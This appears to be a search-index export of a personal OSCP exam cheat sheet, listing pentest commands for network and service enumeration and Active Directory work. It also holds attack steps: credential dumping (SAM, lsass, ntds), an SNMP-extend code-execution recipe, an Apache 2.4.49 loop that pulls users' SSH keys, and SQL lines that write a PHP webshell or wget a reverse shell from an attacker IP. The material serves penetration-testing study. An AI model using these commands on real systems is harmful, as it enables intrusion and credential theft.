{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Info</p> <p>\ud83c\udf6a My Quick Reference is designed to align intuitively with the way I think. I highly recommend creating your own personalized version during your preparation. It helps you quickly access what you actually need\u2014without cluttering your main cheat sheet with things you already know.</p>"},{"location":"#curious-how-i-got-a-free-oscp-exam-check-out-my-medium-article-where-i-share-the-full-story","title":"Curious how I got a free OSCP exam? Check out my Medium article where I share the full story","text":""},{"location":"#my-oscp-environment","title":"My OSCP Environment","text":"<p>I built and continuously enhanced my personal OSCP-pentest environment over time\u2014polishing tool layouts, workflows, and integrations to match my exact needs. Now, anyone can replicate that fully optimized setup in just seconds by running <code>OSCP_envsetup.sh</code>, which you\u2019ll find in the pakcyberbots_OSCP_environment folder.</p>"},{"location":"#what-it-includes","title":"\ud83d\udd27 What It Includes","text":"<ul> <li> <p>Multi\u2011terminal layout   Opens multiple Terminator windows with split panels, each pre\u2011configured with the proper environment variables for various scenarios \u2014 including a full OSCP exam setup.</p> </li> <li> <p>Markdown-to-PDF reporting   One command transforms Obsidian-style notes into polished PDFs, complete with captions, borders, and consistent styling\u2014perfect for formal deliverables.</p> </li> <li> <p>Terminal session logging   Automatically records everything typed or output in my shell (even reverse shells). A lifesaver when creating logs after the fact or catching something I missed.</p> </li> <li> <p>Smart HTTP file server (<code>fuzzy-httpserver</code>)   Launches a dynamic HTTP server that autocorrects typos, allows quick upload, and ships with a library of pentest binaries\u2014ideal for sharing tools during engagements.</p> </li> <li> <p>BloodHound via Docker (<code>bloodhound-docker</code>)   Instantly deploys or tears down BloodHound containers with pre-defined settings\u2014no manual setup required.</p> </li> <li> <p>Obsidian Markdown templates   Includes ready-to-use templates for note-taking, vulnerability write-ups, and final reporting. Uses the Templater plugin to auto-fill IPs, timestamps, and structure.</p> </li> <li> <p>Terminator shortcuts   Includes keybindings for:</p> </li> <li> <p>Vertical split: Ctrl\u202f+\u202fShift\u202f+\u202fL</p> </li> <li>Horizontal split: Ctrl\u202f+\u202fShift\u202f+\u202fJ</li> <li>Zoom pane: Ctrl\u202f+\u202fShift\u202f+\u202fZ</li> <li>Close pane: Ctrl\u202f+\u202fShift\u202f+\u202fW</li> <li>Cycle panes: Ctrl\u202f+\u202fTab</li> <li>Switch to white theme: Ctrl\u202f+\u202fN</li> </ul>"},{"location":"#why-it-works","title":"\ud83c\udfaf Why It Works","text":"<ul> <li>Speed &amp; consistency \u2013 I can spin up my complete environment in one go, with no manual fiddling.</li> <li>Professional output \u2013 Notes and logs are formatted cleanly for professional-grade deliverables.</li> <li>Focused on OSCP workflows \u2013 The tools and layouts reflect the real exam environment.</li> <li>Extensible &amp; shareable \u2013 Everything is portable, themable, and easy to tweak or expand.</li> </ul> <p>You can match this setup in just seconds: download and run <code>OSCP_envsetup.sh</code> present inside my GitHub Repo \u2014 and replicate my environment exactly.</p>"},{"location":"#some-recommended-resources-to-practice-from","title":"Some Recommended Resources to Practice From","text":"<ul> <li>LainKusanagi List of OSCP like machines</li> <li>TJ Null List</li> <li>Rana Khalil Writups</li> <li>IppSec Walkthroughs</li> </ul>"},{"location":"#recommended-cheatsheets","title":"Recommended CheatSheets","text":"<ul> <li>https://krovs.github.io/oscp-notes/</li> <li>Hacktricks (Without Search Issue)</li> <li>Internal All The Things</li> <li>TryHackMe AD Exploitation Module</li> <li>exploit notes hdks</li> </ul>"},{"location":"#my-social-media","title":"My Social Media","text":"<p>You can follow me on the below social media for mroe informative future updates</p> <p>\ud83d\udd17 Connect with me:</p> <ul> <li>\ud83c\udf10 Website</li> <li>Twitter/x</li> <li>GitHub</li> <li>LinkedIn</li> <li>Medium</li> <li>YouTube</li> </ul> <p>\u2615 You can support my work here: https://buymeacoffee.com/pakcyberbot</p>"},{"location":"10_Commands_Quick_Reference/","title":"\u2328\ufe0f OSCP Commands - Quick Reference","text":"<p>I used this cheat sheet inside Obsidian due to its powerful customization options. You can see how it looks in Obsidian in the GIF below.</p> <p>You can also download the Markdown file and use it in your own Obsidian setup. I\u2019ll be publishing my full Obsidian vault with all configurations soon, so follow me to stay updated.</p>"},{"location":"10_Commands_Quick_Reference/#tool-docs","title":"Tool Docs","text":"<ul> <li>PowerView Docs</li> <li> <p>Netexec Docs</p> </li> <li> <p>https://github.com/dollarboysushil/oscp-cpts-notes</p> </li> <li>https://github.com/0xsyr0/oscp</li> </ul>"},{"location":"10_Commands_Quick_Reference/#attacker-machine-commands","title":"Attacker Machine Commands","text":""},{"location":"10_Commands_Quick_Reference/#general-linux-commands","title":"General Linux Commands","text":"<pre><code># to create list of IPs for TARGETS.txt\nprintf \"%s\\n\" 192.168.0.{{1..5},8} &gt; TARGETS.txt\n\nsed '/^1/d' file.txt # for deleting all the lines that start with 1\nsudo sed -i '1i ip hostname' /etc/hosts  # 1st line to insert/add\nsudo sed -i '1d' /etc/hosts  # 1st line to delete/remove\n\n# to use DC as a DNS Server for our Kali for only specific AD specific domains\nsudo vim /etc/dnsmasq.conf\n\nsudo vim /etc/resolv.conf\n# add 127.0.0.1 as nameserver so we use dnsmasq\nsudo systemctl restart dnsmasq\n\n# UV command, to isolate python prog req dependencies\nuv add --script &lt;tool-python-name&gt; -r requirements.txt\nuv run &lt;program-name&gt;\n# to quickly run those programs add the below shebang\n#!/usr/bin/env -S uv run --script\nsed -i '1i #!/usr/bin/env -S uv run --script' script.py\n\ncut -d ' '\nsed \npaste -d ':' username passwords  # to combine in columns\nawk '{print $5}' file.txt # to effectively get the columns 5 data\n\n# for quick parsing of json files\njq '.computers[].Name'  jsonfile.json\njq '.computers[] | {Name,field2}'  jsonfile.json\n'select(.label | test(\"MANAGEMENT\"))' # search for specific entry on specfiic condition\n'select(.Properties.AdminCount == 1)'\ncat domain_users.json | jq  -r '.[].attributes.sAMAccountName[]'  # -r for not showing double quotes\n# to take specific ip scan from the All_IPs_Nmap Scan\nsed -n '/scan report.*244/,/Nmap scan report/p'  all_Nmap_output | xclip -selection clipboard\n\n\nbinwalk -Me image.png\nexiftool -u -a &lt;image/file&gt;\nfile &lt;file&gt;\n\n\ngrep -irl 'patter' .\ngrep -irn 'patter' .\n\n\nsudo update-alternatives --install /usr/bin/python python \\\n/usr/bin/python3.5 3\n\n\n# in case can't open interactive editor inside the revshell\ncat &lt;&lt;'EOT'&gt; /anyfile\ncontent\nEOT\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#general-enumeration","title":"General Enumeration","text":"<pre><code># Enumeration\nautorecon -t Targets.txt\n\n\n# live host scanning \nfor i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done\n\nnmap -sn -iL TARGETS.txt\nnmap -sn 192.168.0.1-254 # ping sweep\n\nnmap -p 80 192.168.50.1-253 -oG web-sweep.txt # host scan can be done through this\n\n\n\n# Port Scanning\nnc -nv -w 1 -z 192.168.10.1 1-1000 # tcp scan, shows timeout or open ports extra v -nvv for every output\nnc -nv -u -z -w 1 192.168.50.149 120-123 # for udp scan, returns the service name. Has to be run mutliple times\n\n\nwhile IFS= read -r port; do\n    test_url=\"${base_url}:${port}\"\n    response=$(curl -skL --proxy \"$proxy_url\" --max-time 5 --connect-timeout 3 \"$test_url\" 2&gt;/dev/null)\n\n    if ! echo \"$response\" | grep -q \"ERROR\"; then\n        echo \"[+] $test_url may be open behind the proxy\"\n    else\n        echo \"[-] $test_url seems closed or filtered\"\n    fi\ndone &lt; top_ports.txt\n\n\nnmap -sT &lt;ip&gt; # this will be helpful when dealing with certain kind of proxies in between the target\nsudo nmap -sU -sS &lt;ip&gt; \nsudo nmap $IP -sU --max-rtt-timeout 100ms --max-retries 1 --open -T4 -oA udpscan.txt\nnmap -T4 -p- ip  # incase of unstable network\nrustscan -a 127.0.0.1 --range 1-65535 -- -A -Pn  | tee portscan1.txt # prefered\n\n# List of top ports \ncat /usr/share/nmap/nmap-services | grep -v '^#' | sort -k3 -nr | head -n 100\ncat /usr/share/nmap/nmap-services | grep -v '^#' | sort -k3 -nr | head -n 100 | awk '{split($2, a, \"/\"); print a[1]}' &gt; top_ports.txt\n\n\n\n# specific to AD\nnxc smb ip # to quickly look for domain nam\nnmap -script dns-srv-enum --script-args \"dns-srv-enum.domain='domainname'\"\n\nsudo responder -A -I tun0 # must use this, only allowed in analyze mode not poisoning\n# and capture NTLMv2 hashes like typing `dir \\\\attacker-ip\\nonshare` \nhashcat -m 5600 &lt;hash file&gt; &lt;password file&gt; --force\n\n\n# firewall check\nIf a firewall is in place, an ACK scan (`nmap -sA`) shows:  \n`Not shown: 994 filtered ports`\n\nIf no firewall is present, the output shows:  \n`Not shown: 999 unfiltered TCP ports (reset)`\n\nhping3 -S -p 80 -c 1 &lt;target&gt;   # SYN to port 80\nhping3 -S -p 81 -c 1 &lt;target&gt;   # SYN to a random port\n# RST response = port is closed, but host reachable\n# No response = likely dropped silently (firewall)\n# ICMP unreachable = network filter in place\nnmap --script=firewalk --traceroute -Pn -p 1-100 &lt;target&gt;  # [Firwalk nse](https://nmap.org/nsedoc/scripts/firewalk.html)\n\n\n\n# Port knocking\n/etc/init.d/knockd # config\nknock &lt;target-ip&gt; 571 290 911  # port in seq\nfor x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 &amp;&amp; sleep 1; done\n\n\n\n# SQL Enumeration\nmysql -u root -p'root' -h 127.0.0.1 -P 3306 --skip-ssl\nimpacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth # windows-auth forces NTLM instead of kerberos\nimpacket-mssqlclient hostname.domain.com -k -port &lt;no&gt;\n\n\n# CMS\njoomscan\n\n# Wordpress Scanning\nwpscan --url http://ip --disable-tls-checks --api-token &lt;redacted&gt; # WPVulnDB API from wpscan\nwpscan --url http://ip --disable-tls-checks --enumerate u --api-token &lt;redacted&gt;\nwpscan --url http://offsecwp --enumerate ap --plugins-detection aggressive -t 40 --api-token &lt;redacted&gt;\n# pass brute\nwpscan --url http://example.com/ -e u --passwords /usr/share/wordlists/rockyou.txt\nwpscan --url http://example.com/ -U admin --passwords /usr/share/wordlists/rockyou.txt\n\n# Drupal\ndroopescan scan drupal -u http://example.org/ -t 32\n# find version &gt; /CHANGELOG.txt\n\n### Adobe Cold Fusion\n# check version /CFIDE/adminapi/base.cfc?wsdl\n# fckeditor Version 8  LFI &gt; http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en\n\n# Vulnerability Scanning using NSE\nls -1 /usr/share/nmap/scripts/&lt;servic&gt;* # scripts.db (for category check) https://nmap.org/nsedoc/scripts/\nnmap --script-help http-headers\n\ngrep &lt;category&gt; /usr/share/nmap/scripts/scripts.db\nnmap --script vulners # very bulky data for single serrvice\n--script \"vuln\" # for vuln category\n# we can download custom nse scripts, download and shift to nmap scripts folder then\nsudo nmap --script-updatedb\nsudo apt update &amp;&amp; sudo apt install exploitdb # to update the local copy of Exploit Database archive\nsearchsploit --id httpd\nsearchsploit --id openssh 7.2p2\n# some vulns to look for\nnmap -sV --script http-shellshock\n\n\n\n# Git commands\ngit log\ngit show\n\n# [gittools](https://github.com/internetwache/GitTools)\ngitfinder\ngit-dumper http://ip/.git/ destdir\ngitextractor gitdir outdir\n\ngit log\ngit branch\ngit branch -a\ngit config list\ngit status\ngit restore --staged README.md # in order to restory file from staged\ngit diff previous_commit_hash new_commit_hash\ngit clone file:///filepath\n\n# to clone repository inside our kali machine from the victim machine\nGIT_SSH_COMMAND='ssh -i id_rsa -p 22' git clone git@victim_ip:/git-server\n\n.git/logs/HEAD  # to research logs manually\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#service-enumeration","title":"Service Enumeration","text":""},{"location":"10_Commands_Quick_Reference/#dns","title":"DNS","text":"<pre><code># DNS Enumeration\nhost -t &lt;recordtype&gt; hostname.com # recordtype = mx, cname, a, txt\nhost -a hostname.com\nhostname -t NS hostname.com\nhost -l domain.con dnsserver # to do zone transfer\nnslookup hostname 8.8.8.8\ndig @&lt;serverip&gt; hostname ANY \ndig axfr @namserver megacorpone.com # zone transfer\n\ndnsrecon -d example.com -t std\ndnsrecon -d example.com -D ~/wordlist.txt -t brt\ndnsenum offseclab.io --threads 100\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#https","title":"HTTP(S)","text":"<pre><code># WEB DAV\ndavtest --url http://x.x.x.x\n\n# to interact with webdav server\ncadaver http://&lt;IP&gt;/&lt;webdavpath&gt;\ndav&gt; put /usr/share/webshells/asp/webshell.asp\n\n# or manually\n# let's suppose only html file is allowed in webdav using PUT method\ncurl -X PUT http://10.10.10.15/test.html -d @test.html\n# we can PUT and then use MOVE method to rename the file extension to aspx, php or any exe to get revshell\ncurl -X MOVE --header 'Destination:http://10.10.10.15/test.aspx' 'http://10.10.10.15/test.html'\n# to verify\ncurl http://10.10.10.15/test.aspx\n\n\nnikto http://website.com\n\n# to list http headers only\ncurl -I http://website.com\n\nopenssl s_client -connect $ip:443\n\n\n# apache http 2.4.49 exploit\nfor i in {'user2','user1','user2','user3'};do echo \"extracting $i\"; ./apache2.4.49.sh webtargets.txt \"/home/$i/.ssh/id_ecdsa\"; done\n# check every id file\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#smb","title":"SMB","text":"<pre><code># SMB &amp; netbios enumeration\nsudo nbtscan -r 192.168.50.0/24  # it enumerates netbios name service runs on 137\nnmap -p 445 --script smb* &lt;target&gt;\nenum4linux -a &lt;target&gt;\nenum4linux -u 'domain/user' -p 'pass' -a &lt;target&gt;\nsmbclient -L //&lt;target&gt; -N\nsmbclient -L //&lt;target&gt; -U &lt;username&gt;%&lt;password&gt;\nsmbclient //&lt;target&gt;/&lt;sharename&gt; -U &lt;username&gt;\nsmbmap -H &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt; -R\n\nfor ip in $(cat smbhosts.txt);do enum4linux -U $ip &gt;&gt; enum4.out;done\n\n\nsmbclient &gt; prompt off\nsmbclient &gt; recurse on\nsmbclient &gt; mget *\n\n\nnxc smb &lt;iprange&gt;  # only search for windows machine\nnxc smb &lt;ipraneg&gt; -u '' -p '' --shares # to look for null session\nnxc smb &lt;iprange&gt; -u 'guest' -p '' --shares\n\nnxc smb &lt;ip&gt; -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True # to download all the file from smb shares\nnxc smb &lt;ip&gt; -u 'user' -p 'pass'  --user # try enumerate thru guest user and null session\n\nnxc smb &lt;ip&gt; -u 'user' -p 'pass' --rid-brute # to enumerate users using rid bruteforcing\nnxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol # domain pass policy\nnxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt # to check which target hasn't enforced smb signing so we can relay ntml\n\nnetexec smb 172.16.238.83   -u 'user' -p 'pass' --spider C --pattern txt,pdf,doc,docx \n\n# ADMINS RIGHTS NEEDED\n\n# sensitive data dumping, if user is admin\nnxc smb ip -u user -p pass --sam\nnxc smb ip -u user -p pass -M lsassy\nnxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil  # dumps ntds.dit and SYSTEM and parse these using secretsdump\n# enumerate loggedon-users if you have admin rights on that machine then impersonate as that user\nnxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users\n\nnetexec smb &lt;target-ip&gt; -u &lt;username&gt; -p &lt;password&gt; --exec-method smbexec -x \"whoami\"\n\nimpacket-smbclient \"user\":'password'@ip\n\n# In case of the error in smbclient copying large files\n# parallel_read returned NT_STATUS_IO_TIMEOUT\n\nsmbclient --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t &lt;timout&gt;\n\n# OR Use the below \n\nsmbclient -m SMB2 -N '//server/share' -c 'timeout 120; iosize 16384; get \\\"My Files\\More Files\\\"\\version_1\\file.txt' -U &lt;username&gt;\n\n\n# Active Directory\nGroups.xml # could have passwords in it\n# AES encrypted password can be decrypted as it's available everywhere using tool too\ngpp-decrypt &lt;aes_enc_pass&gt;\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#snmp","title":"SNMP","text":"<pre><code># SNMP Enumeration\ndownload-mibs # so instead of OID, we can get MIB for easier enumeration.\nsudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt\n# onesixtyone tool setup\necho public &gt; community\necho private &gt;&gt; community\necho manager &gt;&gt; community # OR /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt\nfor ip in $(seq 1 254); do echo 192.168.50.$ip; done &gt; ips\nonesixtyone -c community -i ips\n\n# SNMP querying\nsnmpwalk -c public -v1 -t 10 192.168.50.151\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25 # oid for user enumeration, specific to server it's for windows\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2 # currently running processes\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2 # softwares installed on the machine\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3 # list all the listening TCP port connections\n# https://mibbrowser.online/mibdb_search.php\n\n\n\n# RCE or script execution\n\n# NET-SNMP-EXTEND-MIB executes the mentioned script when queried if these options are set to 1\n# These OIDs must be set correctly:\n# - nsExtendExecType = 1 (exec)\n# - nsExtendRunType = 1 (run-on-read)\n# - nsExtendStatus = 1 (active)\nsnmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extended\nsnmpwalk -v 1 -c public 192.168.10.10\u00a0 NET-SNMP-EXTEND-MIB::nsExtendOutputFull\n\n# How to check writable permission on SNMP\n# Try writing a test OID (like sysContact). If it succeeds, SNMP is writable.\nsnmpset -v 1 -c public $IP SNMPv2-MIB::sysContact.0 s \"test\"\n\n# If writable, try checking access to extend entries (optional)\nsnmpwalk -v 1 -c public $IP NET-SNMP-EXTEND-MIB\n\n\n# snmpset command for RCE\n# This creates a new extend entry named \"HAX\" that runs `/bin/bash -c 'id &gt; /tmp/pwned'`\nsnmpset -v 1 -c public $IP \\\n  NET-SNMP-EXTEND-MIB::nsExtendCommand.\\\"HAX\\\" s \"/bin/bash\" \\\n  NET-SNMP-EXTEND-MIB::nsExtendArgs.\\\"HAX\\\" s \"-c 'id &gt; /tmp/pwned'\" \\\n  NET-SNMP-EXTEND-MIB::nsExtendExecType.\\\"HAX\\\" i 1 \\\n  NET-SNMP-EXTEND-MIB::nsExtendRunType.\\\"HAX\\\" i 1 \\\n  NET-SNMP-EXTEND-MIB::nsExtendStatus.\\\"HAX\\\" i 1\n\n# Trigger the RCE\nsnmpwalk -v 1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\\\"HAX\\\"\n\n# Cleanup (optional)\nsnmpset -v 1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendStatus.\\\"HAX\\\" i 6  # destroy(6)\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#smtppop3imap","title":"SMTP/POP3/IMAP","text":"<pre><code># SMTP Enumeration\nnmap x.x.x.x --script=smtp* -p 25\n# smtp-open-relay, smtp-commands\n# smtp commands after connecting through netcat\nsmtp&gt; VRFY &lt;emailaddr&gt;\nnc -C 192.168.227.199 25 # sometimes server wait for carriage return to in case of windows \\r\\n\ntelnet ip 25\n#this can be done through evolution GUI tool\nsudo swaks -t victim@domain.com --from test@domain.com -ap --attach @config.Library-ms --server 192.168.227.199 --body @body.txt --header \"Subject: Problems\" --suppress-data\n# user enumeration\nsmtp-user-enum -M RCPT -D domain.com -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.227.199\n\n# POP3\n#connect and check for banner\ntelnet $ip 110\n\nEHLO all\n\n#guess login credentials\nUSER pelle\nPASS admin\n#list all emails\nlist\n#retrieve email number 5 for example\nretr 5\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#ftp","title":"FTP","text":"<pre><code>ftp -A anonymous@192.168.10.1  # -A more stable\nftp &gt; passive\nftp &gt; binary\nftp &gt; help\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#rpc","title":"RPC","text":"<pre><code>rpcinfo $IP\n\nrpcclient -U \"corp.com/user\" dc-ip\nrpcclient -N dc-ip # Null\nrpcclient -U \"\" &lt;IP&gt; # Anonymous\nrpcclient -U \"guest&amp;\" &lt;IP&gt; # Public\nrpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash\n\nrpc&gt; lookupdomain corp.com\nrpc&gt; help\n\nenumdomusers\nenumdomgroups\nlookupnames &lt;username&gt;\nenumprivs\nqueryuser &lt;user&gt;\nquerygroup &lt;group&gt;\nquerydispinfo\nsrvinfo\n\nchgpasswd\nsetuserinfo\n# to change pass in case of GenericAll Permission\nrpcclient&gt; setuserinfo2 username 23 newpass\n\n# KALI net command\n\n# We can execute net commands remotely from kali using\n# Enumerate users in a Windows/AD domain via RPC\nnet rpc user -U 'DOMAIN/username%password' -S DC_IP\n# Reset a user's password if you have proper rights (e.g., GenericAll)\nnet rpc password \"TargetUser\" \"newP@ssword2022\" -U \"nagoya-industries.com\"/\"controlleduser\"%\"Nagoya2023\" -S $IP1            \n# Shut down or reboot a remote machine via RPC\nnet rpc shutdown -S TargetIP -U 'DOMAIN/admin%Pass'   # clean shutdown\nnet rpc shutdown -r -f -S TargetIP -U 'DOMAIN/admin%Pass'  # forced reboot\n# Manage remote Windows services\nnet rpc service stop ServiceName -S TargetIP -U 'DOMAIN/admin%Pass'\nnet rpc service start ServiceName -S TargetIP -U 'DOMAIN/admin%Pass'\n\n\nnet service list                                # List services\n# User &amp; group management\nnet user add &lt;username&gt; &lt;options&gt;               # Add local user\nnet user delete &lt;username&gt;\nnet group addmember &lt;group&gt; &lt;user&gt;\nnet group removemember &lt;group&gt; &lt;user&gt;\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#ldap","title":"LDAP","text":"<pre><code>sudo nmap $IP1 -p389 --script=ldap*\n\n# check null credentials are valid\nldapsearch -x -H ldap://&lt;IP&gt; -D '' -w '' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\nldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\\&lt;username&gt;' -w '&lt;password&gt;' -b \"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\n# without creds\nldapsearch -v -x -b \"DC=domain,DC=com\" -H \"ldap://192.168.x.x\" \"(objectclass=*)\"\n\n# LDAP Enumeration\nldapdomaindump -u '&lt;domain&gt;\\&lt;user&gt;' -p '&lt;pass&gt;' &lt;ip&gt;\ncat domain_users.json | jq  -r '.[].attributes.sAMAccountName[]'  &gt; domain_users.txt\n\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\\\\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \n# find all users\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=user)\"\n\n# find a specific user by username\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(sAMAccountName=&lt;name&gt;)\"\n# find all groups\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=group)\"\n# find groups a specific user belongs to\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(&amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;))\"\n# find all computer objects\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=computer)\"\n\n\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m users --dc-ip $IP1\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m members -s 'domain admin'\n-m groups\ncomputers\nprivileged-users\n\n# LAPS Dumping\nnetexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps\nldapsearch -x -H \"ldap://dc-ip\" -D \"domain\\user\" -w \"password\" -b \"dc=domain,dc=com\" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#oracle-database-1521","title":"Oracle Database (1521)","text":"<pre><code># [odat wiki](https://github.com/quentinhardy/odat/wiki)\nodat sidguesser -s 10.10.10.82 -p 1521\nodat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /opt/myarsenal/odat/accounts/accounts-multiple.txt\n\n#  /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt\ncp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt odat/accounts/\n\n# vim command to repace space with forward slash\n# :%s/ /\\//g\n\n\n# ODAT has a utlfile module that allows you to upload, download or delete a file\nodat utlfile -s 10.10.10.82 -p 1521 -U \"scott\" -P \"tiger\" -d XE --putFile /temp rem_shell.exe local_shell.exe --sysdba\n\n# to execute that shell\nodat externaltable -s 10.10.10.82 -p 1521 -U \"scott\" -P \"tiger\" -d XE --exec /temp rem_shell.exe local_shell.exe --sysdba\n\n\ndbeaver # to connect to oracle database easily\n\nodat search -s $SERVER -d $SID -U $USER -P $PASSWORD --sql-shell # not tested\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#unknown-ports","title":"Unknown ports","text":"<pre><code>nc -nv $IP port_number\n# try pressing enter\nhelp\nversion\n\n# port 3003\nnc -nv $IP 3003 \nhelp\nversion\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#sql-services","title":"SQL Services","text":"<ul> <li>MSSQL 1433</li> <li>MySQL 3306</li> <li>PostgreSQL 5437 <pre><code># MySQL\nmysql -u root -p 'root' -h 192.168.10.10 -P 3306\n\nselect version(); | show databases;\u00a0 | use databse | select * from users; | show tables |\u00a0 select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre\n\nmysqldump --databases Magic -&lt;usser&gt; -&lt;pass&gt;\n\n\n# MS SQL\nnmap -n -v -sV -Pn -p 1433 \u2013script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip\nimpacket-mssqlclient Administrator:'pass'@x.x.x.x -windows-auth\n\nSELECT @@version;\u00a0 | SELECT name FROM sys.databases;\u00a0 | SELECT _FROM offsec.information_schema.tables;\u00a0 |\u00a0 select_ from offsec.dbo.users;\n\nnetexec mssql x.x.x.x --use-kcache -x 'whoami /all' --port 14330\n\n\n# PostgreSQL\npsql -U postgres -p 5437 -h IP\u00a0 \nselect pg_ls_dir('./');\u00a0 | select pg_ls_dir('/etc/password');\u00a0 | select pg_ls_dir('/home/wilson');\u00a0 | select pg_ls_dir('/home/Wilson/local.txt');\n</code></pre></li> </ul>"},{"location":"10_Commands_Quick_Reference/#sql-commands","title":"Sql Commands","text":"<pre><code>-- MySQL \nselect version();\nselect system_user();\nshow databases;\nuse databasename;\nshow tables;\nSelect * FROM database.usertable \nSELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'TABLES' AND TABLE_SCHEMA = 'information_schema';\nSELECT GROUP_CONCAT(col1,'+',col2,':') from tables; -- combines multiple rows and columns into single entry\n\n-- indirect cmd exec through file upload\nSELECT '&lt;?php system($_GET[\"cmd\"]);?&gt;' INTO OUTFILE '/var/www/html/tmp/webshell.php' -- error displayed shouldn't impact the file creation\n\n9999 union select 1,(select '&lt;?php exec(\\\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\\\");?&gt;'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'\n\n\n-- MS SQL\nselect @@version;\nuse database;\nSELECT name FROM sys.databases;\nSELECT * FROM &lt;database&gt;.information_schema.tables;\nselect * from database.dbo.users;\nSELECT name FROM sys.tables; -- to see all the tables within the specific database\nSELECT table_catalog, table_name, column_name FROM information_schema.columns \nSELECT * FROM sysusers;\nSELECT name, type_desc FROM sys.all_objects;\nSELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'your_table_name' AND TABLE_SCHEMA = 'dbo';\nSELECT string_agg(COLUMN_NAME,',') FROM database.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';\nstring_agg(table_name,',')\n\n-- To enumerate users\nselect sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\n\n-- SQL Server has a special permission, named\u00a0`IMPERSONATE`, that\u00a0allows the executing user to take on the permissions of another user\u00a0or login until the context is reset or the session ends.\n-- Link : [hacktricks impersonation of the users](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#impersonation-of-other-users)\n-- Find users you can impersonate \nSELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' \n--Check if the user \"sa\" or any other high privileged user is mentioned # Impersonate sa user \nEXECUTE AS LOGIN = 'sa' \nSELECT 